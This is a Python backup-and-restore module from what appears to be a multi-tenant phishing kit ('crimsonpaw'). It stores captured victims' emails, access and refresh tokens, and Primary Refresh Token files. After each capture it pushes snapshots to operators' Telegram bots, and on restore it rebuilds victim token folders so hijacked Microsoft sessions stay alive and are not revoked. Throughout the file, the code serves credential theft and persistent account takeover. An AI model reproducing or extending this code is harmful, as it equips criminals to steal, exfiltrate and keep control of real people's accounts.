"""Tenant-scoped database backup, Telegram delivery and restore.

Design goals
------------
* Every tenant (master admin and each client subscriber) owns an independent
  backup/restore cycle. Neither depends on the other.
* Backups are *scoped snapshots*: a client's backup contains only that client's
  rows, so restoring it can never overwrite another tenant's data.
* Captures trigger an automatic snapshot pushed to the tenant's own Telegram bot,
  so a killed VPS/domain still leaves a recoverable copy off-box.
"""
import io
import json
import os
import shutil
import sqlite3
import tempfile
import threading
import time
import urllib.request
import uuid
from datetime import datetime

from config import Config

import logging
logger = logging.getLogger(__name__)

BACKUP_DIR = os.path.join(os.path.dirname(os.path.abspath(Config.DB_PATH)), 'backups')

# Victim artifact folders live beside the project, not beside whatever DB file
# happens to be in use (tests copy the DB to /tmp).
VICTIMS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'victims')

# Tables that hold tenant data, with the column used to scope them.
# `None` means the table is scoped indirectly (see _scoped_rows).
SCOPED_TABLES = ('sessions', 'deployments', 'keyword_rules', 'keyword_matches',
                 'b2b_campaigns', 'templates', 'preland_templates',
                 'deployment_hits', 'keyword_alert_ledger', 'owned_domains')

# Side table inside the snapshot holding on-disk victim artifacts. `roadtx.prt`
# is a full PRT JSON document that cannot be rebuilt from the DB — without it
# the token refresher fails and auto-revokes the restored session.
ARTIFACT_TABLE = '_victim_artifacts'

# Tables with no owner_id of their own, scoped through a parent row.
#   table -> (parent table, local fk column, parent fk column)
INDIRECT_TABLES = {
    'keyword_matches':      ('sessions', 'session_user_code', 'user_code'),
    'deployment_hits':      ('deployments', 'deployment_id', 'id'),
    'keyword_alert_ledger': ('sessions', 'session_user_code', 'user_code'),
}

# Master-owned rows are identified by owner_id IS NULL.
_AUTO_THROTTLE = {}          # owner_key -> monotonic timestamp of last auto-backup
_AUTO_LOCK = threading.Lock()
AUTO_MIN_INTERVAL = 45       # seconds; coalesces bursts of captures


def _owner_key(owner_id):
    return 'master' if owner_id is None else f'client:{owner_id}'


def _ensure_dir():
    os.makedirs(BACKUP_DIR, exist_ok=True)


def _scoped_rows(conn, table, owner_id):
    """Return rows of `table` belonging to this tenant."""
    if table in INDIRECT_TABLES:
        # Scoped through the parent row that owns them.
        parent, fk, parent_fk = INDIRECT_TABLES[table]
        sql = (f"SELECT t.* FROM {table} t "
               f"JOIN {parent} p ON p.{parent_fk} = t.{fk} ")
        if owner_id is None:
            return conn.execute(sql + f"WHERE p.owner_id IS NULL").fetchall()
        return conn.execute(sql + "WHERE p.owner_id = ?", (owner_id,)).fetchall()

    if owner_id is None:
        return conn.execute(f"SELECT * FROM {table} WHERE owner_id IS NULL").fetchall()
    return conn.execute(f"SELECT * FROM {table} WHERE owner_id = ?", (owner_id,)).fetchall()


def create_snapshot(owner_id=None):
    """Write a tenant-scoped snapshot to disk and return its path.

    The snapshot is a real SQLite database with the full schema, so it can be
    restored directly and inspected with any SQLite tool.
    """
    _ensure_dir()
    scope = _owner_key(owner_id).replace(':', '-')
    stamp = datetime.now().strftime('%Y%m%d-%H%M%S')
    path = os.path.join(BACKUP_DIR, f'crimsonpaw-{scope}-{stamp}-{uuid.uuid4().hex[:6]}.db')

    src = sqlite3.connect(Config.DB_PATH)
    src.row_factory = sqlite3.Row
    dst = sqlite3.connect(path)
    try:
        # 1. Copy the schema only.
        for (sql,) in src.execute(
                "SELECT sql FROM sqlite_master WHERE sql IS NOT NULL "
                "AND type IN ('table','index') AND name NOT LIKE 'sqlite_%'"):
            try:
                dst.execute(sql)
            except sqlite3.OperationalError:
                pass

        # 2. Copy this tenant's rows.
        for table in SCOPED_TABLES:
            try:
                rows = _scoped_rows(src, table, owner_id)
            except sqlite3.OperationalError:
                continue
            for row in rows:
                d = dict(row)
                # Re-home rows onto the restoring tenant so a restore into a
                # different account id still lands in the right partition.
                if 'owner_id' in d:
                    d['owner_id'] = owner_id
                cols = ', '.join(f'"{k}"' for k in d)
                qs = ', '.join('?' for _ in d)
                try:
                    dst.execute(f'INSERT INTO "{table}" ({cols}) VALUES ({qs})',
                                tuple(d.values()))
                except sqlite3.IntegrityError:
                    pass

        # 3. Capture on-disk artifacts for this tenant's sessions.
        dst.execute(f"CREATE TABLE IF NOT EXISTS {ARTIFACT_TABLE} "
                    "(user_code TEXT, filename TEXT, content BLOB)")
        victims_dir = VICTIMS_DIR
        for row in _scoped_rows(src, 'sessions', owner_id):
            uc = row['user_code']
            vdir = os.path.join(victims_dir, uc)
            if not os.path.isdir(vdir):
                continue
            for fn in ('.roadtools_auth', 'roadtx.prt'):
                fp = os.path.join(vdir, fn)
                if os.path.isfile(fp):
                    try:
                        with open(fp, 'rb') as fh:
                            dst.execute(f"INSERT INTO {ARTIFACT_TABLE} VALUES (?,?,?)",
                                        (uc, fn, fh.read()))
                    except OSError:
                        pass
        dst.commit()
    finally:
        src.close()
        dst.close()
    return path


def _tenant_telegram(owner_id):
    """Resolve the Telegram bot/chat that should receive this tenant's backups."""
    try:
        if owner_id is None:
            if not os.path.exists('settings.json'):
                return None, None
            with open('settings.json', encoding='utf-8') as f:
                cfg = json.load(f)
            return (cfg.get('tg_bot_token') or '').strip(), (cfg.get('tg_chat_id') or '').strip()
        import db
        user = db.get_operator(owner_id)
        if not user:
            return None, None
        return (user.get('tg_bot_token') or '').strip(), (user.get('tg_chat_id') or '').strip()
    except Exception as e:
        logger.error(f"[BACKUP] telegram resolve failed: {e}")
        return None, None


def send_to_telegram(path, owner_id=None, caption=None):
    """Upload a snapshot file to the tenant's Telegram bot. Returns True on success."""
    bot, chat = _tenant_telegram(owner_id)
    if not bot or not chat:
        return False
    try:
        boundary = '----crimsonpaw' + uuid.uuid4().hex
        with open(path, 'rb') as f:
            payload = f.read()
        cap = caption or f"🗄️ Backup {datetime.now():%Y-%m-%d %H:%M:%S}"
        parts = []
        for name, value in (('chat_id', chat), ('caption', cap)):
            parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode())
        parts.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="document"; '
            f'filename="{os.path.basename(path)}"\r\nContent-Type: application/octet-stream\r\n\r\n'.encode()
            + payload + b'\r\n')
        parts.append(f'--{boundary}--\r\n'.encode())
        body = b''.join(parts)
        req = urllib.request.Request(
            f'https://api.telegram.org/bot{bot}/sendDocument',
            data=body,
            headers={'Content-Type': f'multipart/form-data; boundary={boundary}'})
        urllib.request.urlopen(req, timeout=45)
        return True
    except Exception as e:
        logger.error(f"[BACKUP] telegram upload failed: {e}")
        return False


def auto_backup(owner_id=None):
    """Snapshot + Telegram push after a capture. Throttled per tenant."""
    key = _owner_key(owner_id)
    now = time.monotonic()
    with _AUTO_LOCK:
        if now - _AUTO_THROTTLE.get(key, 0) < AUTO_MIN_INTERVAL:
            return
        _AUTO_THROTTLE[key] = now

    def _run():
        try:
            path = create_snapshot(owner_id)
            send_to_telegram(path, owner_id,
                             caption=f"🆕 New capture — auto backup {datetime.now():%Y-%m-%d %H:%M}")
            _prune(owner_id)
        except Exception as e:
            logger.error(f"[BACKUP] auto backup failed: {e}")

    threading.Thread(target=_run, daemon=True).start()


def _prune(owner_id=None, keep=25):
    """Keep only the newest `keep` snapshots per tenant."""
    try:
        scope = _owner_key(owner_id).replace(':', '-')
        files = sorted(
            (f for f in os.listdir(BACKUP_DIR) if f.startswith(f'crimsonpaw-{scope}-')),
            reverse=True)
        for f in files[keep:]:
            os.remove(os.path.join(BACKUP_DIR, f))
    except Exception:
        pass


def list_snapshots(owner_id=None):
    _ensure_dir()
    scope = _owner_key(owner_id).replace(':', '-')
    out = []
    for f in sorted(os.listdir(BACKUP_DIR), reverse=True):
        if not f.startswith(f'crimsonpaw-{scope}-'):
            continue
        p = os.path.join(BACKUP_DIR, f)
        out.append({'name': f, 'bytes': os.path.getsize(p),
                    'created': datetime.fromtimestamp(os.path.getmtime(p)).strftime('%Y-%m-%d %H:%M:%S')})
    return out


def restore_from_file(filepath, owner_id=None):
    """Restore a snapshot into the live DB, replacing only this tenant's data.

    Other tenants are untouched. Returns a summary dict.
    """
    if not os.path.exists(filepath):
        return {'success': False, 'error': 'Backup file not found'}

    # Validate it is a real SQLite database before touching anything.
    try:
        probe = sqlite3.connect(f'file:{filepath}?mode=ro', uri=True)
        probe.execute('SELECT COUNT(*) FROM sqlite_master').fetchone()
        probe.close()
    except Exception as e:
        return {'success': False, 'error': f'Not a valid database file: {e}'}

    src = sqlite3.connect(filepath)
    src.row_factory = sqlite3.Row
    live = sqlite3.connect(Config.DB_PATH)
    restored = {}
    try:
        # Wipe this tenant's current rows first (true restore, not a merge).
        # Indirect tables go first so their parents can be replaced.
        for table, (parent, fk, parent_fk) in INDIRECT_TABLES.items():
            if owner_id is None:
                live.execute(f"DELETE FROM {table} WHERE {fk} IN "
                             f"(SELECT {parent_fk} FROM {parent} WHERE owner_id IS NULL)")
            else:
                live.execute(f"DELETE FROM {table} WHERE {fk} IN "
                             f"(SELECT {parent_fk} FROM {parent} WHERE owner_id = ?)",
                             (owner_id,))
        for table in SCOPED_TABLES:
            if table in INDIRECT_TABLES:
                continue
            if owner_id is None:
                live.execute(f"DELETE FROM {table} WHERE owner_id IS NULL")
            else:
                live.execute(f"DELETE FROM {table} WHERE owner_id = ?", (owner_id,))

        def _insert(table, d, drop_id=True):
            if drop_id:
                d.pop('id', None)
            if 'owner_id' in d:
                d['owner_id'] = owner_id
            cols = ', '.join(f'"{k}"' for k in d)
            qs = ', '.join('?' for _ in d)
            cur = live.execute(f'INSERT INTO "{table}" ({cols}) VALUES ({qs})',
                               tuple(d.values()))
            return cur.lastrowid

        # Sessions: user_code is UNIQUE across all tenants, so a collision with
        # another tenant's capture gets a suffix instead of overwriting it.
        uc_map = {}
        rows = src.execute("SELECT * FROM sessions").fetchall()
        n = 0
        for row in rows:
            d = dict(row)
            old_uc = d.get('user_code')
            # Same person already captured in this tenant? Replace that row
            # rather than leaving a stale duplicate beside the restored one.
            email = (d.get('victim_email') or '').strip().lower()
            if email and email != 'unknown':
                if owner_id is None:
                    stale = live.execute(
                        "SELECT user_code FROM sessions WHERE LOWER(TRIM(victim_email)) = ? "
                        "AND owner_id IS NULL", (email,)).fetchall()
                else:
                    stale = live.execute(
                        "SELECT user_code FROM sessions WHERE LOWER(TRIM(victim_email)) = ? "
                        "AND owner_id = ?", (email, owner_id)).fetchall()
                for (suc,) in stale:
                    live.execute("DELETE FROM sessions WHERE user_code = ?", (suc,))
            new_uc = old_uc
            if live.execute("SELECT 1 FROM sessions WHERE user_code = ?", (new_uc,)).fetchone():
                i = 2
                while live.execute("SELECT 1 FROM sessions WHERE user_code = ?",
                                   (f'{old_uc}-{i}',)).fetchone():
                    i += 1
                new_uc = f'{old_uc}-{i}'
            d['user_code'] = new_uc
            uc_map[old_uc] = new_uc
            _insert('sessions', d)
            n += 1
        restored['sessions'] = n

        # Deployments: ids shift, so record a map for deployment_hits.
        dep_map = {}
        n = 0
        for row in src.execute("SELECT * FROM deployments").fetchall():
            d = dict(row)
            old_id = d.get('id')
            dep_map[old_id] = _insert('deployments', d)
            n += 1
        restored['deployments'] = n

        # Remaining owner-scoped tables (ids are local, so let SQLite assign).
        for table in SCOPED_TABLES:
            if table in ('sessions', 'deployments') or table in INDIRECT_TABLES:
                continue
            try:
                rows = src.execute(f"SELECT * FROM {table}").fetchall()
            except sqlite3.OperationalError:
                continue
            n = 0
            for row in rows:
                try:
                    _insert(table, dict(row))
                    n += 1
                except sqlite3.IntegrityError:
                    pass
            restored[table] = n

        # Indirect tables last, with their foreign keys remapped.
        for table, (parent, fk, parent_fk) in INDIRECT_TABLES.items():
            try:
                rows = src.execute(f"SELECT * FROM {table}").fetchall()
            except sqlite3.OperationalError:
                continue
            mapping = uc_map if parent == 'sessions' else dep_map
            n = 0
            for row in rows:
                d = dict(row)
                new_fk = mapping.get(d.get(fk))
                if new_fk is None:
                    continue
                d[fk] = new_fk
                try:
                    _insert(table, d)
                    n += 1
                except sqlite3.IntegrityError:
                    pass
            restored[table] = n
        live.commit()

        # Rebuild each restored victim's artifact directory. Without this the
        # token refresher finds no roadtx.prt, fails three times and flips the
        # session to REVOKED within ~90s — the restore looks like it worked and
        # then the account silently dies.
        rebuilt = _rebuild_artifacts(src, uc_map)
        restored['artifacts'] = rebuilt
        return {'success': True, 'restored': restored}
    except Exception as e:
        live.rollback()
        return {'success': False, 'error': str(e)}
    finally:
        src.close()
        live.close()


def _rebuild_artifacts(src, uc_map):
    """Recreate victim folders (auth file + PRT) for restored sessions.

    Returns the number of sessions whose artifacts were rebuilt.
    """
    victims_dir = VICTIMS_DIR
    rebuilt = 0

    # Prefer artifacts stored in the snapshot — roadtx.prt is a full PRT JSON
    # document that cannot be derived from the DB row.
    stored = {}
    try:
        for r in src.execute(f"SELECT user_code, filename, content FROM {ARTIFACT_TABLE}"):
            stored.setdefault(r[0], {})[r[1]] = r[2]
    except sqlite3.OperationalError:
        pass

    for old_uc, new_uc in uc_map.items():
        try:
            row = src.execute("SELECT * FROM sessions WHERE user_code = ?", (old_uc,)).fetchone()
            if not row:
                continue
            d = dict(row)
            vdir = os.path.join(victims_dir, new_uc)
            os.makedirs(vdir, exist_ok=True)

            have = stored.get(old_uc) or {}
            if have:
                for fn, content in have.items():
                    with open(os.path.join(vdir, fn), 'wb') as f:
                        f.write(content)
                rebuilt += 1
                continue

            # No stored artifacts (older snapshot): synthesize what we can.
            at = d.get('access_token') or ''
            rt = d.get('refresh_token') or ''
            auth = {
                'tokenType': 'Bearer',
                'expiresOn': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'tenantId': 'common',
                '_clientId': '29d9ed98-a469-4536-ade2-f981bc1d605e',
                'accessToken': at,
                'refreshToken': rt,
            }
            with open(os.path.join(vdir, '.roadtools_auth'), 'w', encoding='utf-8') as f:
                json.dump(auth, f)

            prt = d.get('prt_cookie')
            if prt:
                with open(os.path.join(vdir, 'roadtx.prt'), 'w', encoding='utf-8') as f:
                    f.write(prt if isinstance(prt, str) else json.dumps(prt))
            rebuilt += 1
        except Exception as e:
            logger.warning(f"[RESTORE] artifact rebuild failed for {new_uc}: {e}")
    return rebuilt
